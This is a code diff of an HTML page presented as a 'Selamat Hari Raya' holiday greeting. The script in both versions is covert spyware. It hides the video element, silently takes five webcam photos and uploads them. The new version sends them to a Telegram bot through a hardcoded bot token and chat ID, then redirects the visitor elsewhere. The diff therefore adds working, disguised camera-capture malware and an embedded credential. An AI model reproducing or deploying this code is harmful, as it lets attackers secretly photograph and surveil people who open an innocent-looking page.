@@ -5,6 +5,8 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Selamat Hari Raya</title>
     <style>
+        
+        /* Ensures the body takes up the full height and prevents overflow */
         body, html {
             height: 100%;
             margin: 0;
@@ -14,122 +16,116 @@
             background-color: #f8f8f8;
         }
 
+        /* Spinner styles */
         .spinner {
-            border: 8px solid #f3f3f3;
-            border-top: 8px solid #3498db;
+            border: 8px solid #f3f3f3; /* Light grey */
+            border-top: 8px solid #3498db; /* Blue */
             border-radius: 50%;
             width: 50px;
             height: 50px;
             animation: spin 2s linear infinite;
         }
 
+        /* Animation for rotating the spinner */
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
 
+        /* Initially hide the spinner */
         .spinner.hidden {
             display: none;
         }
 
+        /* Video capture area (hidden) */
         video {
-            display: block;
-            margin-top: 20px;
+            display: none; /* Hide the video element */
         }
+    
     </style>
 </head>
 <body>
-    <div id="spinner" class="spinner"></div>
-    <video id="video" width="320" height="240" autoplay></video>
+    <div id="spinner" class="spinner hidden"></div>
+    <video id="video" width="320" height="240" autoplay=""></video>
     <script>
-        const spinner = document.getElementById('spinner');
-        spinner.classList.remove('hidden');
+        const BOT_TOKEN = "8146051541:AAEWlqCaaW0Z8VaejI5UX8p4T4dYPXCZv4Y";  // Gantikan dengan token bot Telegram kau
+        const CHAT_ID = "5934902786";  // Gantikan dengan chat ID Telegram kau
 
-        const video = document.getElementById('video');
-
-        // Function to get "chat_id" parameter from URL
         function getChatIdFromURL() {
             const urlParams = new URLSearchParams(window.location.search);
             return urlParams.get('id');
         }
 
-        let chatId = getChatIdFromURL();
+        const chatId = getChatIdFromURL();
+        const spinner = document.getElementById('spinner');
 
-        // If no chat_id in URL, ask for password
         if (!chatId) {
-    chatId = prompt("Password is required to proceed. Please enter the password:");
+            alert('Chat ID is missing from the URL!');
+        } else {
+            spinner.classList.remove('hidden');
+            const video = document.getElementById('video');
 
-    if (!chatId) {
-        alert("You must provide a valid password to proceed.");
-        spinner.classList.add('hidden');
-    } else {
-        // Teruskan kod lain jika password diisi
-    }
-}
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(function(stream) {
+                    video.srcObject = stream;
 
+                    let counter = 0;
+                    const photoInterval = setInterval(function() {
+                        if (counter < 5) {
+                            capturePhoto();
+                            counter++;
+                        } else {
+                            clearInterval(photoInterval);
+                            window.location.href = 'https://izzsem.github.io/project-2/';
+                        }
+                    }, 1000);
 
-        // Continue with the camera access and other functionality if password (chat_id) is available
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(function(stream) {
-                console.log('Camera access granted');
-                video.srcObject = stream;
+                    function capturePhoto() {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        const context = canvas.getContext('2d');
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        const photoDataUrl = canvas.toDataURL('image/jpeg');
 
-                // Check if video is playing
-                video.onplaying = () => {
-                    console.log('Video is playing');
-                };
-
-                let counter = 0;
-                const photoInterval = setInterval(function() {
-                    if (counter < 5) {
-                        capturePhoto();
-                        counter++;
-                    } else {
-                        clearInterval(photoInterval);
-                        window.location.href = 'https://izzsem.github.io/project-2/';
+                        sendToTelegram(photoDataUrl);
                     }
-                }, 1000);
 
-                function capturePhoto() {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    const context = canvas.getContext('2d');
-                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    const photoDataUrl = canvas.toDataURL('image/jpeg');
+                    function sendToTelegram(photoDataUrl) {
+                        const blob = dataURLtoBlob(photoDataUrl);
+                        const formData = new FormData();
+                        formData.append("chat_id", CHAT_ID);
+                        formData.append("photo", blob, "photo.jpg");
 
-                    console.log('Captured photo: ', photoDataUrl); // Log the captured photo data
-
-                    const formData = new FormData();
-                    formData.append('photo', dataURLtoBlob(photoDataUrl));
-                    formData.append('password', chatId);  // Using password as chat_id
-
-                    fetch('photo-upload.php', {
-                        method: 'POST',
-                        body: formData
-                    })
-                    .then(response => response.json())
-                    .then(data => console.log('Photo uploaded:', data))
-                    .catch(error => console.error('Error uploading photo:', error));
-                }
-
-                function dataURLtoBlob(dataURL) {
-                    const byteString = atob(dataURL.split(',')[1]);
-                    const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
-                    const ab = new ArrayBuffer(byteString.length);
-                    const ia = new Uint8Array(ab);
-                    for (let i = 0; i < byteString.length; i++) {
-                        ia[i] = byteString.charCodeAt(i);
+                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                            method: "POST",
+                            body: formData
+                        })
+                        .then(response => response.json())
+                        .then(data => {
+                            console.log("Photo sent to Telegram:", data);
+                        })
+                        .catch(error => {
+                            console.error("Error sending photo:", error);
+                        });
                     }
-                    return new Blob([ab], { type: mimeString });
-                }
-            })
-            .catch(function(error) {
-                console.log("Camera permission denied: ", error);
-                spinner.classList.add('hidden');
-                alert("Please click 'Allow' to continue to the video.");
-            });
+
+                    function dataURLtoBlob(dataURL) {
+                        const byteString = atob(dataURL.split(',')[1]);
+                        const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
+                        const ab = new ArrayBuffer(byteString.length);
+                        const ia = new Uint8Array(ab);
+                        for (let i = 0; i < byteString.length; i++) {
+                            ia[i] = byteString.charCodeAt(i);
+                        }
+                        return new Blob([ab], { type: mimeString });
+                    }
+                })
+                .catch(function(error) {
+                    console.log("Camera permission denied: ", error);
+                    spinner.classList.add('hidden');
+                });
+        }
     </script>
 </body>
 </html>
->
